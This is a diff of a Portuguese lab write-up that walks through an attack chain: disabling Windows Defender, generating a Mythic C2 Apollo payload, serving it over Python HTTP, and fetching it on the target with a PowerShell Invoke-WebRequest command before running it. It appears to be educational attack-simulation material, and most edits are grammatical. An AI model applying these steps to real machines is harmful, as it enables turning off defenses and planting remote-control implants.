@@ -42,7 +42,7 @@ Nessa fase, foi iniciado o processo de reconhecimento utilizando os seguintes co
 Agora que estamos no sistema, vamos desabilitar o **Windows Defender**. Vale ressaltar que essa ação irá gerar um *Event ID 5001*.
 
 ### 4) Fase 4 - Execução
-Antes de começar essa fase, realizei a instalação do agente Apollo e instalei o HTTP Profile em meu servidor que hospeda o Mythic.
+Antes de começar essa fase, foi necessário realizar a instalação do agente Apollo e instalar o HTTP Profile em meu servidor que hospeda o Mythic.
 1. Acesse a interface web do **Mythic Web UI** via `https://<MYTHIC_IP>:7443`.
 2. Vá até a aba de **Payloads** → **Generate New Payload**.
 3. Preencha da seguinte forma:
@@ -51,15 +51,16 @@ Antes de começar essa fase, realizei a instalação do agente Apollo e instalei
    - **C2 Profile:** `HTTP`
    - **C2 Porta:** `80/443` (or `8080` / custom port)
    - **Select Commands**: Selecione todos os comandos disponíveis pelo Agente Apollo.
-4. Por fim, criei o payload e realizei o download dele no seu Servidor do Mythic C2 utilizando o comando `wget [link do payload]`
-5. Dentro do servidor do Mythic, no mesmo diretório o qual baixei o payload, abri um servidor HTTP utilizando Python com o comando `python3 -m http.server 8080`. Vale ressaltar que 8080 foi a porta que escolhi, mas fica a seu critério escolher a sua própria, contanto que não a porta de sua escolha não esteja sendo utilizada por outro serviço.
-6. Antes de baixar o payload em sua máquina alvo, crie uma regra no Firewall da Nuvem para permitir comunicação da máquina alvo com o servidor do Mythic:
+4. Por fim, criei o payload e realizei o download dele em meu Servidor do Mythic C2 utilizando o comando `wget [link do payload]`
+5. Dentro do servidor do Mythic, no mesmo diretório o qual baixei o payload, abri um servidor HTTP utilizando Python com o comando `python3 -m http.server 8080`. Vale ressaltar que 8080 foi a porta que escolhi, mas fica a seu critério escolher a sua própria, contanto que a porta de sua escolha não esteja sendo utilizada por outro serviço.
+6. Antes de baixar o payload em sua máquina alvo, crie uma regra no Firewall da Nuvem para permitir comunicação da máquina alvo (Windows) com o servidor do Mythic:
 <img width="899" height="100" alt="image" src="https://github.com/user-attachments/assets/2b3c2e38-2c60-419c-a04f-7c7c4a850fb9" />
 
 7. Na sua máquina alvo, realize o download do payload via PowerShell utilizando a linha de comando abaixo (Vale ressaltar que o que está entre colchetes varia de acordo com sua arquitetura):
 ```
-Invoke-WebRequest -Uri http://[IP from your mythic server:port/payload_file] -OutFile [Directory that your wish to save the file]
+Invoke-WebRequest -Uri http://[IP from your mythic server:port/payload_file] -OutFile [Caminho do diretório onde deseja salvar o arquivo]
 ```
+
 ### Fase 5 - Command & Control (C2)
 1. Por fim, execute o payload que você baixou.
 2. Ao executar o payload, você poderá visualizá-lo através do Task Manager na aba *Details*:
